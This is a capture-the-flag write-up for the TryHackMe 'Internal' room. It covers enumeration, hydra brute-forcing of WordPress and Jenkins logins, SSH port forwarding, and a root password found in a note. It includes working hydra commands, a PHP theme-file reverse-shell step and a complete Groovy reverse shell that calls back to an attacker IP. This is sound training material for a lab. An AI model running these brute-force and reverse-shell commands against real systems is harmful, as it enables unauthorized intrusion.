---
title: "TryHackMe - Internal"
author: Nasrallah
description: ""
date: 2023-06-09 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, hard, tunneling, hydra, bruteforce, wordpress, jenkins]
img_path: /assets/img/tryhackme/internal
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Internal](https://tryhackme.com/room/internal) from [TryHackMe](https://tryhackme.com).

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.143.121
Host is up (0.10s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6efaefbef65f98b9597bf78eb9c5621e (RSA)
|   256 ed64ed33e5c93058ba23040d14eb30e9 (ECDSA)
|_  256 b07f7f7b5262622a60d43d36fa89eeff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There is ssh on port 22 and Apache on 80.

## Web

Let's navigate to the web site after we add `internal.thm` to /etc/hosts

![](1.png)

It's the default page for Apache, let's run a directory scan.

```terminal
 $ feroxbuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.143.121                                                               
                                                                                                                                                              
 ___  ___  __   __     __      __         __   ___                                                                                                            
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__                                                                                                             
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___                                                                                                            
by Ben "epi" Risher 🤓                 ver: 2.7.2                                                                                                             
───────────────────────────┬──────────────────────                                                                                                            
 🎯  Target Url            │ http://10.10.143.121                                                                                                             
 🚀  Threads               │ 50                                                                                                                               
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/big.txt                                                                                
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]                                                                               
 💥  Timeout (secs)        │ 7                                                                                                                                
 🦡  User-Agent            │ feroxbuster/2.7.2                                                                                                                
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml                                                                                               
 🏁  HTTP methods          │ [GET]                                                                                                                            
 🔃  Recursion Depth       │ 4                                                                                                                                
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest                                                                            
───────────────────────────┴──────────────────────                                                                                                            
 🏁  Press [ENTER] to use the Scan Management Menu™                                                                                                           
──────────────────────────────────────────────────                                          
200      GET      375l      964w    10918c http://10.10.143.121/
403      GET        9l       28w      278c http://10.10.143.121/.htaccess
403      GET        9l       28w      278c http://10.10.143.121/.htpasswd
301      GET        9l       28w      313c http://10.10.143.121/blog => http://10.10.143.121/blog/
301      GET        9l       28w      319c http://10.10.143.121/javascript => http://10.10.143.121/javascript/
301      GET        9l       28w      319c http://10.10.143.121/phpmyadmin => http://10.10.143.121/phpmyadmin/
403      GET        9l       28w      278c http://10.10.143.121/server-status
301      GET        9l       28w      318c http://10.10.143.121/wordpress => http://10.10.143.121/wordpress/
301      GET        9l       28w      322c http://10.10.143.121/blog/wp-admin => http://10.10.143.121/blog/wp-admin/
301      GET        9l       28w      324c http://10.10.143.121/blog/wp-content => http://10.10.143.121/blog/wp-content/
301      GET        9l       28w      325c http://10.10.143.121/blog/wp-includes => http://10.10.143.121/blog/wp-includes/
301      GET        9l       28w      327c http://10.10.143.121/wordpress/wp-admin => http://10.10.143.121/wordpress/wp-admin/
301      GET        9l       28w      329c http://10.10.143.121/wordpress/wp-content => http://10.10.143.121/wordpress/wp-content/
301      GET        9l       28w      330c http://10.10.143.121/wordpress/wp-includes => http://10.10.143.121/wordpress/wp-includes/
```

We found `/blog`, `phpmyadmin` and `wordpress`.

Let's check the first one

![](2.png)

It's clearly a wordpress site.

Let's run `wpscan` and see what we can find.

```terminal
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.21 
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://internal.thm/blog/ [10.10.143.121]
[+] Started: Mon Jun 19 09:15:33 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://internal.thm/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/
 | Last Updated: 2023-03-29T00:00:00.000Z
 | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 3.2
 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'

[i] No DB Exports Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <================================================================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

```

We found the username `admin`.

## Hydra

Let's brute force the login page using `hydra`

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt internal.thm http-post-form "/blog/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username" -t 30
```

![](3.png)

We got the password, let's log in

# **Foothold**

To get a shell, we go to Theme editor, select 404.php and replace the php code with a reverse shell.

![](4.png)

We setup a listener and request the file.

```bash
http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
```

![](5.png)

We got the shell!

# **Privilege Escalation**

On the /opt directory we find a text file that contains credentials.

```text
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:<REDACTED>
```

Let's switch to user `aubreanna`.

On aubreanna's home directory we find an interesting txt file

```text
Internal Jenkins service is running on 172.17.0.2:8080
```

This tells us there is a web page on 172.17.0.2:8080 running Jenkins.

Let's forward that port using ssh.

```bash
ssh -L 8080:172.17.0.2:8080 aubreanna@internal.thm 
```

Now we navigate to `127.0.0.1:8080`

![](6.png)

It's jenkins login page.

Let's use `hydra` again to brute force the password as admin.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8080 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:F=loginError" -t 30
```

![](7.png)

We got the password, let's login.

![](8.png)

To ge a shell with jenkins, we go to `manage jenkins` and select `Script Console`

This console can run `Groovy` so we'll use the following groovy reverse shell.

```groovy
String host="10.10.10.10";int port=9002;String cmd="sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

![](9.png)

We setup a listener and click run.

![](10.png)

Checking the `/opt` directory we find the following note.

```bash
cd /opt
ls -l
total 4
-rw-r--r-- 1 root root 204 Aug  3  2020 note.txt
ls -la
total 12
drwxr-xr-x 1 root root 4096 Aug  3  2020 .
drwxr-xr-x 1 root root 4096 Aug  3  2020 ..
-rw-r--r-- 1 root root  204 Aug  3  2020 note.txt
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:<REDACTED>
```

We got the root password, now we just ssh to the target as root and get the flag.

I hoped the creator of the room made it a little bit harder at the end by adding a challenge to escape docker and not just giving us the root password.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

